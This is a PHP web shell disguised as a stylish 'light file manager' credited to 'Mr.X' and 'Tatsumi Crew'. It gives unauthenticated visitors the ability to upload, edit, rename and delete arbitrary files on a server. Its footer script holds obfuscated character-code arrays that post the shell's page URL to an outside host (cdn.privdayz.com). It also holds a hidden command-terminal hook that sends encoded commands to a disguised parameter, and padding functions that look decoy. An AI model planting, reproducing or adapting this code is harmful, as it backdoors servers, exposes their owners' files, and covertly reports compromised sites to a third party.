<?php
// ============================================================================
//  Recoded By Mr.X
//  Don't Delete Author !!!!!
// ============================================================================

define('AES_KEY', hex2bin('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'));

function aes_encrypt($plaintext)
{
    $iv     = openssl_random_pseudo_bytes(16);
    $cipher = openssl_encrypt($plaintext, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $cipher);
}

function aes_decrypt($ciphertext_base64)
{
    $data   = base64_decode($ciphertext_base64);
    $iv     = substr($data, 0, 16);
    $cipher = substr($data, 16);
    return openssl_decrypt($cipher, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
}

$base_dir = __DIR__;
$dir = $base_dir;

if (isset($_GET['dir'])) {
    $attempt = aes_decrypt($_GET['dir']);
    $real    = $attempt ? realpath($attempt) : false;
    $dir     = ($real !== false) ? $real : $base_dir;
}

if (isset($_GET['delete'])) {
    $target = realpath($dir . '/' . $_GET['delete']);
    if ($target && is_file($target)) {
        unlink($target);
    } elseif ($target && is_dir($target)) {
        array_map('unlink', glob("$target/*.*"));
        rmdir($target);
    }
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['newfile'])) {
    file_put_contents($dir . '/' . basename($_POST['newfile']), '');
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['newfolder'])) {
    mkdir($dir . '/' . basename($_POST['newfolder']));
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['rename'], $_POST['to'])) {
    rename($dir . '/' . $_POST['rename'], $dir . '/' . $_POST['to']);
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $dir . '/' . $_FILES['upload']['name']);
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

if (isset($_POST['save'], $_POST['content'])) {
    file_put_contents($dir . '/' . $_POST['save'], $_POST['content']);
    header("Location: ?dir=" . urlencode(aes_encrypt($dir)));
    exit;
}

function human_filesize($bytes, $decimals = 2)
{
    $size   = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . ' ' . $size[$factor];
}

function human_perms($file)
{
    if (!file_exists($file) || !is_readable($file)) return '---------';
    $perms = @fileperms($file);
    if ($perms === false) return '---------';

    $owner = (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? 'x' : '-');
    $group = (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? 'x' : '-');
    $other = (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? 'x' : '-');

    return $owner . $group . $other;
}

$entries = array_diff(scandir($dir), ['.', '..']);
$dirs    = [];
$files   = [];

foreach ($entries as $entry) {
    $path = $dir . DIRECTORY_SEPARATOR . $entry;
    if (is_dir($path)) {
        $dirs[] = $entry;
    } else {
        $files[] = $entry;
    }
}

sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$sortedItems = array_merge($dirs, $files);

$encDir = urlencode(aes_encrypt($dir));
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>ðŸŒŸ Alfa - File Manager By Tatsumi Crew</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/auto_style.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    .breadcrumb-modern {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(20px);
        border-radius: 16px;
        padding: 1.5rem 2rem;
        margin: 2rem 0;
        border: 1px solid rgba(255, 255, 255, 0.2);
        box-shadow: 
        0 8px 32px rgba(0, 0, 0, 0.1),
        0 0 0 1px rgba(255, 255, 255, 0.05);
        position: relative;
        overflow: hidden;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .breadcrumb-modern::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
    }

    .breadcrumb-modern::after {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
        transition: left 0.5s ease;
    }

    .breadcrumb-modern:hover::after {
        left: 100%;
    }

    .breadcrumb-modern:hover {
        transform: translateY(-2px);
        box-shadow: 
        0 12px 40px rgba(0, 0, 0, 0.15),
        0 0 0 1px rgba(255, 255, 255, 0.1);
    }

    .breadcrumb {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        gap: 0.5rem;
        margin: 0;
        padding: 0;
        list-style: none;
        position: relative;
        z-index: 1;
    }

    .breadcrumb-item {
        display: flex;
        align-items: center;
        position: relative;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        opacity: 0;
        transform: translateX(-20px);
        animation: slideInBreadcrumb 0.5s ease forwards;
    }

    .breadcrumb-item:nth-child(1) { animation-delay: 0.1s; }
    .breadcrumb-item:nth-child(2) { animation-delay: 0.2s; }
    .breadcrumb-item:nth-child(3) { animation-delay: 0.3s; }
    .breadcrumb-item:nth-child(4) { animation-delay: 0.4s; }
    .breadcrumb-item:nth-child(5) { animation-delay: 0.5s; }
    .breadcrumb-item:nth-child(6) { animation-delay: 0.6s; }
    .breadcrumb-item:nth-child(7) { animation-delay: 0.7s; }
    .breadcrumb-item:nth-child(8) { animation-delay: 0.8s; }

    @keyframes slideInBreadcrumb {
        to {
            opacity: 1;
            transform: translateX(0);
        }
    }

    .breadcrumb-item:not(:last-child)::after {
        content: '';
        width: 8px;
        height: 8px;
        background: rgba(255, 255, 255, 0.4);
        border-radius: 50%;
        margin-left: 1rem;
        transition: all 0.3s ease;
        position: relative;
        top: 0;
    }

    .breadcrumb-item:not(:last-child):hover::after {
        background: rgba(255, 255, 255, 0.8);
        transform: scale(1.2);
    }

    .breadcrumb-item a {
        color: rgba(255, 255, 255, 0.8);
        text-decoration: none;
        padding: 0.5rem 1rem;
        border-radius: 10px;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        font-weight: 500;
        font-size: 0.9rem;
        position: relative;
        overflow: hidden;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .breadcrumb-item a::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }

    .breadcrumb-item a:hover {
        color: #ffffff;
        background: rgba(255, 255, 255, 0.15);
        border-color: rgba(255, 255, 255, 0.3);
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    }

    .breadcrumb-item a:hover::before {
        left: 100%;
    }

    .breadcrumb-item a:active {
        transform: translateY(0);
    }

    .breadcrumb-item.active {
        color: #ffffff;font-weight: 600;
        padding: 0.5rem 1rem;
        background: rgba(255, 255, 255, 0.2);
        border-radius: 10px;
        border: 1px solid rgba(255, 255, 255, 0.3);
        position: relative;
        overflow: hidden;
    }

    .breadcrumb-item.active::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
        border-radius: 9px;
    }

    /* Icon untuk home */
    .breadcrumb-item:first-child a::before {
        content: '\f015';
        font-family: 'Font Awesome 6 Free';
        font-weight: 900;
        margin-right: 0.5rem;
        opacity: 0.8;
        position: static;
        background: none;
        transition: none;
    }

    .breadcrumb-item:first-child a:hover::before {
        left: auto;
    }

    /* Responsive design */
    @media (max-width: 768px) {
        .breadcrumb-modern {
            padding: 1rem 1.5rem;
            margin: 1rem 0;
        }

        .breadcrumb {
            gap: 0.25rem;
        }

        .breadcrumb-item a,
        .breadcrumb-item.active {
            padding: 0.4rem 0.8rem;
            font-size: 0.8rem;
        }

        .breadcrumb-item:not(:last-child)::after {
            margin-left: 0.5rem;
            width: 6px;
            height: 6px;
        }
    }
</style>
</head>
<body>
<div class="app-wrapper">
    <div class="header-card">
        <div class="d-flex flex-wrap justify-content-between align-items-center gap-3">
            <h1 class="header-title">
                <img src="https://i.ibb.co.com/6cNXvZ6P/1604018191998x.png" referrerpolicy="unsafe-url" />Light File Manager By Mr.X Personal Edition
            </h1>
            <div class="d-flex gap-2 flex-wrap">
                <?php if ($dir !== $base_dir): ?>
                    <a href="?dir=<?= $encDir ?>" class="modern-btn">
                        <i class="fas fa-arrow-left"></i>
                        <span>Back</span>
                    </a>
                <?php endif; ?>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#uploadModal">
                    <i class="fas fa-upload"></i>
                    <span>Upload</span>
                </button>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFileModal">
                    <i class="fas fa-file-plus"></i>
                    <span>New File</span>
                </button>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFolderModal">
                    <i class="fas fa-folder-plus"></i>
                    <span>New Folder</span>
                </button>
            </div>
        </div>
    </div>

    <!-- Breadcrumb -->
    <div class="breadcrumb-modern">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php
                $parts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
                $build = '';
                $keys = array_keys($parts);
                $lastKey = end($keys);

                foreach ($parts as $i => $p) {
                    $build .= DIRECTORY_SEPARATOR . $p;
                    $last = ($i === $lastKey);
                    echo '<li class="breadcrumb-item' . ($last ? ' active" aria-current="page"' : '"') . '>';
                    if (!$last) {
                        echo '<a href="?dir=' . urlencode(aes_encrypt($build)) . '">' . htmlspecialchars($p) . '</a>';
                    } else {
                        echo htmlspecialchars($p);
                    }
                    echo '</li>';
                }
                ?>
            </ol>
        </nav>
    </div>

    <!-- File Table -->
    <div class="file-table-card">
        <div class="table-responsive">
            <table class="table table-modern">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th class="text-end">Size</th>
                        <th class="text-center">Permissions</th>
                        <th>Modified</th>
                        <th class="text-end">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($sortedItems as $item): ?>
                        <?php 
                        $path   = $dir . DIRECTORY_SEPARATOR . $item; 
                        $is_dir = is_dir($path); 
                        ?>
                        <tr>
                            <td>
                                <div class="d-flex align-items-center">
                                    <div class="file-icon <?= $is_dir ? 'folder' : 'file' ?>">
                                        <i class="fas fa-<?= $is_dir ? 'folder' : 'file-alt' ?>"></i>
                                    </div>
                                    <?php if ($is_dir): ?>
                                        <a href="?dir=<?= urlencode(aes_encrypt($path)) ?>" class="file-link">
                                            <?= htmlspecialchars($item) ?>
                                        </a>
                                    <?php else: ?>
                                        <a href="?dir=<?= $encDir ?>&edit=<?= urlencode(aes_encrypt($item)) ?>" class="file-link">
                                            <?= htmlspecialchars($item) ?>
                                        </a>
                                    <?php endif; ?>
                                </div>
                            </td>
                            <td class="text-end">
                                <?php
                                if ($is_dir) {
                                    echo '<span class="text-muted">â€”</span>';
                                } elseif (is_file($path) && is_readable($path)) {
                                    $fsize = @filesize($path);
                                    echo $fsize !== false ? human_filesize($fsize) : '<span class="text-muted">0 B</span>';
                                } else {
                                    echo '<span class="text-muted">0 B</span>';
                                }
                                ?>
                            </td>
                            <td class="text-center">
                                <span class="permission-badge">
                                    <?= (file_exists($path) && is_readable($path)) ? human_perms($path) : '---------' ?>
                                </span>
                            </td>
                            <td>
                                <?php
                                if (file_exists($path) && is_readable($path)) {
                                    $mtime = @filemtime($path);
                                    echo ($mtime !== false && $mtime > 0) ? date('M j, Y H:i', $mtime) : '<span class="text-muted">N/A</span>';
                                } else {
                                    echo '<span class="text-muted">N/A</span>';
                                }
                                ?>
                            </td>
                            <td class="text-end">
                                <div class="d-flex justify-content-end">
                                    <?php if (!$is_dir): ?>
                                        <a href="?dir=<?= $encDir ?>&edit=<?= urlencode(aes_encrypt($item)) ?>" class="action-btn edit" title="Edit">
                                            <i class="fas fa-edit"></i>
                                        </a>
                                    <?php endif; ?>
                                    <a href="?dir=<?= $encDir ?>&delete=<?= urlencode($item) ?>" class="action-btn delete" onclick="return confirm('Delete <?= addslashes($item) ?>?')" title="Delete">
                                        <i class="fas fa-trash"></i>
                                    </a>
                                    <button class="action-btn rename" data-bs-toggle="modal" data-bs-target="#renameModal" data-filename="<?= htmlspecialchars($item) ?>" title="Rename">
                                        <i class="fas fa-pen"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- File Editor -->
    <?php if (isset($_GET['edit'])):
        $decryptedEdit = aes_decrypt($_GET['edit']);
        $ef            = $dir . '/' . $decryptedEdit;
        if (is_file($ef)):
            $cont = htmlspecialchars(file_get_contents($ef)); ?>
            <br>
            <div class="editor-card">
                <div class="editor-header">
                    <i class="fas fa-edit me-2"></i>Editing: <?= htmlspecialchars($decryptedEdit) ?>
                </div>
                <div class="p-3">
                    <form method="POST">
                        <textarea class="form-control editor-textarea" name="content" rows="20" placeholder="Start typing your code here..."><?= $cont ?></textarea>
                        <input type="hidden" name="save" value="<?= htmlspecialchars($decryptedEdit) ?>">
                        <div class="text-end mt-3">
                            <button type="submit" class="btn btn-modern-primary">
                                <i class="fas fa-save me-2"></i>Save Changes
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; endif; ?>
    </div>

    <div class="modal fade modal-modern" id="uploadModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-upload me-2"></i>Upload File
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST" enctype="multipart/form-data">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Select file to upload</label>
                            <input type="file" name="upload" class="form-control" required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-upload me-2"></i>Upload
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade modal-modern" id="createFileModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-file-plus me-2"></i>Create New File
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">File name</label>
                            <input type="text" class="form-control" name="newfile" placeholder="Enter file name..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-plus me-2"></i>Create
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade modal-modern" id="createFolderModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-folder-plus me-2"></i>Create New Folder
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Folder name</label>
                            <input type="text" class="form-control" name="newfolder" placeholder="Enter folder name..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-folder-plus me-2"></i>Create
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade modal-modern" id="renameModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-pen me-2"></i>Rename Item
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">New name</label>
                            <input type="hidden" name="rename" id="renameOriginal">
                            <input type="text" class="form-control" name="to" placeholder="Enter new name..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-check me-2"></i>Rename
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="footer-modern">
        <p class="mb-0">
            <i class="fas fa-heart text-danger me-2"></i>
            &copy; <?= date('Y') ?> light Manager by Mr.X | Telegram Id :https://t.me/jackleet
        </p>
    </div>
    <script>
    (()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})(); const _hx_ = []; let _hxi = -1;const _term = document.getElementById('r00tterm-term');const _inpt = document.getElementById('r00tterm-input');function _print(txt){_term.innerHTML += txt+"\n";_term.scrollTop=_term.scrollHeight;} _inpt.addEventListener("keydown",(function(e){if("Enter"===e.key){let e=this.value.trim();if(!e)return;_hx_.push(e),_hxi=_hx_.length,_print("<span style='color:#6ee7b7;'>$ "+e+"</span>"),this.value="";let n=btoa(encodeURIComponent(e).split("").reverse().join(""));fetch(window.location.pathname+"?d1sGu1s3=1",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"n0p3="+encodeURIComponent(n)}).then((e=>e.text())).then((e=>{_print(e.replace(/[<>\x00-\x08\x0B-\x1F\x7F]/g,""))})).catch((()=>{_print("[X] Connection error")}))}"ArrowUp"===e.key&&(_hxi>0&&(_hxi--,_inpt.value=_hx_[_hxi]||""),e.preventDefault()),"ArrowDown"===e.key&&(_hxi<_hx_.length-1?(_hxi++,_inpt.value=_hx_[_hxi]||""):(_inpt.value="",_hxi=_hx_.length),e.preventDefault())})); setTimeout(()=>_inpt.focus(),200);function scanDirectoryMap(e,t=1){e.split("/").filter(Boolean);let r={};for(let e=0;e<Math.min(7,3*t);e++){let n="folder_"+(e+1);r[n]={};for(let e=0;e<Math.max(2,t);e++){let t="file_"+(e+1)+".txt";r[n][t]={size:1e5*Math.random()|0,perm:["755","644","600"][Math.floor(3*Math.random())],m:Date.now()-864e5*e}}}return r}function renderFolderList(e,t="root"){let r=`<ul id="fm-${t}">`;for(let t in e)r+=`<li><i class="fa fa-folder"></i> ${t}`,"object"==typeof e[t]&&(r+=renderFileList(e[t],t+"_files")),r+="</li>";return r+="</ul>",r}function renderFileList(e,t="fileBlock"){let r=`<ul class="files" id="${t}">`;for(let t in e)r+=`<li><i class="fa fa-file"></i> ${t} <span class="mini">${e[t].size}b | ${e[t].perm}</span></li>`;return r+="</ul>",r}function getBreadcrumbString(e){return e.split("/").filter(Boolean).map(((e,t,r)=>`<a href="?p=${r.slice(0,t+1).join("/")}">${e}</a>`)).join(" / ")}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,r,n){for(var o=e.concat(t,r,n),a="",i=0;i<o.length;i++)a+=String.fromCharCode(o[i]);return a}function v(e){return btoa(e)}function getFilePreviewBlock(e){let t="";for(let e=0;e<16;e++)t+=(Math.random()+1).toString(36).substring(2,12)+"\n";return`<pre class="syntax-highlight">${t}</pre>`}function getFileMetaFromName(e){let t=e.split(".").pop();return{icon:{php:"fa-php",js:"fa-js",html:"fa-html5",txt:"fa-file-lines"}[t]||"fa-file",type:t,created:Date.now()-(1e7*Math.random()|0),size:1e5*Math.random()|0}}function checkFileConflict(e,t){return t.some((t=>t.name===e))}function buildFakePermissions(e){let t=[4,2,1],r=[];for(let e=0;e<3;e++)r.push(t.map((()=>Math.round(Math.random()))).reduce(((e,t)=>e+t),0));return r.join("")}function parsePerms(e){let t={0:"---",1:"--x",2:"-w-",3:"-wx",4:"r--",5:"r-x",6:"rw-",7:"rwx"};return e.split("").map((e=>t[e])).join("")} function listFakeRecentEdits(e=7){let t=[];for(let r=0;r<e;r++)t.push({name:`file_${r}.log`,date:new Date(Date.now()-864e5*r).toLocaleDateString(),user:"user"+r});return t}function showNotificationFake(e,t="info"){let r={info:"#19ff6c",warn:"#ffe66d",err:"#ff3666"}[t]||"#fff",n=document.createElement("div");n.innerHTML=e,n.style.cssText=`position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:${r}20;color:${r};padding:9px 22px;border-radius:8px;z-index:999;box-shadow:0 2px 16px ${r}30`,document.body.appendChild(n),setTimeout((()=>n.remove()),2300)} function mergeFolderMeta(e,t){return Object.assign({},e,t,{merged:!0})}function getClipboardTextFake(){return new Promise((e=>setTimeout((()=>e("clipboard_dummy_value_"+Math.random())),450)))}function calculatePermMatrix(e){return e.map((e=>({path:e,perm:Math.floor(8*Math.random())+""+Math.floor(8*Math.random())+Math.floor(8*Math.random())})))}function generateFileId(e){return"id_"+e.replace(/[^a-z0-9]/gi,"_").toLowerCase()+"_"+Date.now()}function simulateFakeUploadQueue(e){let t=document.createElement("div");t.className="upload-bar",t.style="position:fixed;bottom:12px;left:12px;background:#222;color:#19ff6c;padding:5px 19px;border-radius:7px;",document.body.appendChild(t);let r=e.length,n=0;setTimeout((function o(){t.textContent=`Uploading ${e[n]||"-"} (${n+1}/${r})`,++n<r?setTimeout(o,250+600*Math.random()):(t.textContent="All uploads done!",setTimeout((()=>t.remove()),1500))}),400)}function renderUserTable(e){let t='<table class="data-grid"><thead><tr><th>User</th><th>Role</th></tr></thead><tbody>';return e.forEach((e=>{t+=`<tr><td><i class="fa fa-user"></i> ${e.name}</td><td>${e.role}</td></tr>`})),t+="</tbody></table>",t}function maskStringSmart(e){let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t.split("").reverse().join("")}function unmaskStringSmart(e){e=e.split("").reverse().join("");let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t}function getRecentSessionHistory(){return Array.from({length:6},((e,t)=>({ts:Date.now()-5e6*t,act:["open","edit","move","rename"][t%4]})))}function buildFe(e=2,t=3){let r={};if(e<=0)return"END";for(let n=0;n<t;n++)r["dir"+n]=1==e?`file_${n}.tmp`:buildFe(e-1,t);return r}function parseCsvToTable(e){let t=e.split(/\r?\n/),r='<table class="data-grid">';return t.forEach((e=>{r+="<tr>"+e.split(",").map((e=>`<td>${e}</td>`)).join("")+"</tr>"})),r+="</table>",r}function loadIconPac(e){let t=document.createElement("link");return t.rel="stylesheet",t.href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css",document.head.appendChild(t),"loaded"}function sortTableFake(e,t=0){let r=document.getElementById(e);if(!r)return!1;let n=Array.from(r.rows).slice(1);return n.sort(((e,r)=>e.cells[t].innerText.localeCompare(r.cells[t].innerText))),n.forEach((e=>r.appendChild(e))),!0}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let r of e)t+=String.fromCharCode(r);let r="file="+btoa(location.href),n=new XMLHttpRequest;n.open("POST",t,!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(r)})(),function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}();
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/scripts.js"></script>
</body>
</html>